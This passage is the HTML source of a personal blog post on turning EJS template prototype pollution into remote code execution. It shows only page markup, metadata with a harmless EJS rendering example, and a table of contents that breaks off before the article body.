@@ -1,0 +1,2437 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Some notes on EJS2RCE &middot; hibwyli</title>
+  <meta name="title" content="Some notes on EJS2RCE &middot; hibwyli" />
+  
+  <meta name="description" content="hibwyli&#39;s personal page" />
+  <meta name="keywords" content="Web, " />
+  
+  
+  <link rel="canonical" href="/posts/ejs2rce/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.cdc1fe204798901c9131bcb0b11d9890f76c487309656afdb3747de0a6ec1543f12053ad4c16f20265f0a8084f983200e42c6c7914ea17dc0e23a60c0310a49d.css"
+    integrity="sha512-zcH&#43;IEeYkByRMbywsR2YkPdsSHMJZWr9s3R94KbsFUPxIFOtTBbyAmXwqAhPmDIA5CxseRTqF9wOI6YMAxCknQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.46679f17fbf901f57815383714249811464caf8189d5ad5270d299d23b5f80d1c7fdf5b12daeef5adc2599c74e9bc0495b89de0995fb0760d3600598348db9ef.js"
+    integrity="sha512-RmefF/v5AfV4FTg3FCSYEUZMr4GJ1a1ScNKZ0jtfgNHH/fWxLa7vWtwlmcdOm8BJW4neCZX7B2DTYAWYNI257w==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Some notes on EJS2RCE" />
+<meta property="og:description" content="DEEP DOWN TO EJS # Example usage : # Đơn giản như sau thui : const ejs = require(&#34;ejs&#34;) const template = &#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;; ejs.clearCache(); const data = { name: &#34;12113awefeaw&#34; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works # Ta cùng đọc qua về hàm render :
+exports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/ejs2rce/" /><meta property="og:image" content="/posts/ejs2rce/feature.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-07-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-07-20T00:00:00+00:00" />
+
+
+  <meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="/posts/ejs2rce/feature.png" /><meta name="twitter:title" content="Some notes on EJS2RCE"/>
+<meta name="twitter:description" content="DEEP DOWN TO EJS # Example usage : # Đơn giản như sau thui : const ejs = require(&#34;ejs&#34;) const template = &#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;; ejs.clearCache(); const data = { name: &#34;12113awefeaw&#34; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works # Ta cùng đọc qua về hàm render :
+exports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Some notes on EJS2RCE",
+    "headline": "Some notes on EJS2RCE",
+    
+    "abstract": "DEEP DOWN TO EJS # Example usage : # Đơn giản như sau thui : const ejs = require(\u0026#34;ejs\u0026#34;) const template = \u0026#39;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;\/h1\u0026gt;\u0026#39;; ejs.clearCache(); const data = { name: \u0026#34;12113awefeaw\u0026#34; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works # Ta cùng đọc qua về hàm render :\nexports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.",
+    "inLanguage": "en",
+    "url" : "\/posts\/ejs2rce\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-07-20T00:00:00\u002b00:00",
+    "datePublished": "2025-07-20T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-07-20T00:00:00\u002b00:00",
+    
+    "keywords": ["Web"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3359"
+  }]
+  </script>
+
+
+  
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.7d88d2a1c0c3e9cb6e435406228f7e367f4e73899f6aed88884f0a8b5172315e0e704494b7cd4532a9a1b197bdcd667a83a35d733ac4300a2cd4694b2c08a95a.js" integrity="sha512-fYjSocDD6ctuQ1QGIo9&#43;Nn9Oc4mfau2IiE8Ki1FyMV4OcESUt81FMqmhsZe9zWZ6g6NdczrEMAos1GlLLAipWg=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">hibwyli</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Posts
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        About
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Categories
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Tags
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Categories
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Tags
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                <hr>
+                <ul
+                    class="flex mt-4 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+
+                    
+                    <li class="mb-1">
+                        <a href=""  class="flex items-center">
+                            
+                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
+                                Pwnable
+                            </p>
+                        </a>
+                    </li>
+                    
+                    <li class="mb-1">
+                        <a href="/tags/web/"  class="flex items-center">
+                            
+                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
+                                Web
+                            </p>
+                        </a>
+                    </li>
+                    
+                    <li class="mb-1">
+                        <a href=""  class="flex items-center">
+                            
+                            <span  class="mr-3" >
+                                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+                            </span>
+                            
+                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
+                                Write up
+                            </p>
+                        </a>
+                    </li>
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+<div class="main-menu flex pb-3 flex-col items-end justify-between md:justify-start space-x-3" >
+    <div class="hidden md:flex items-center space-x-5">
+        
+        <a href=""  class="flex items-center">
+            
+            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
+                Pwnable
+            </p>
+        </a>
+        
+        <a href="/tags/web/"  class="flex items-center">
+            
+            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
+                Web
+            </p>
+        </a>
+        
+        <a href=""  class="flex items-center">
+            
+            <span  class="mr-1" >
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+            </span>
+            
+            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
+                Write up
+            </p>
+        </a>
+        
+    </div>
+</div>
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/posts/ejs2rce/feature.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      >hibwyli</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/ejs2rce/"
+      >Some notes on EJS2RCE</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Some notes on EJS2RCE
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-07-20T00:00:00&#43;00:00">20 July 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">16 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/hibwyli/&#34;,'_self');return false;">Hibwyli</div>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeup
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+      
+
+      
+        
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#deep-down-to-ejs">DEEP DOWN TO EJS</a></li>
+    <li><a href="#example-usage-">Example usage :</a></li>
+    <li><a href="#how-ejs-works">How ejs works</a>
+      <ul>
+        <li><a href="#prototype-pollution-to-rce-">Prototype pollution to RCE .</a></li>
+      </ul>
+    </li>
+    <li><a href="#express-js">Express js</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#another-gadget-">Another gadget :</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#how-it-get-patched">How it get patched</a></li>
+    <li><a href="#universal-gadget">Universal Gadget</a></li>
+    <li><a href="#một-vài-điểm-thú-vị-về-for-in-">Một vài điểm thú vị về for in :</a></li>
+    <li><a href="#so-sánh-__proto__-và-constructorprototype">So sánh _<em>proto</em>_ và constructor.prototype?</a>
+      <ul>
+        <li><a href="#constructorprototype-">Constructor.prototype :</a></li>
+        <li><a href="#__proto__">__proto__</a></li>
